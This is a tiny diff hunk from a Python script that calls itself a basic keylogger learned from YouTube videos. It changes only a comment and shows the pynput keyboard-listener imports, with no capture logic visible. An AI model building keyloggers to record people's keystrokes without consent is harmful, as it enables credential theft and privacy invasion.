@@ -1,6 +1,7 @@
 #!/bin/python3
+"""
 #This is a basic keylogger created with the help of Youtbe videos.
-
+"""
 
 import pynput
 from pynput.keyboard import Key, Listener
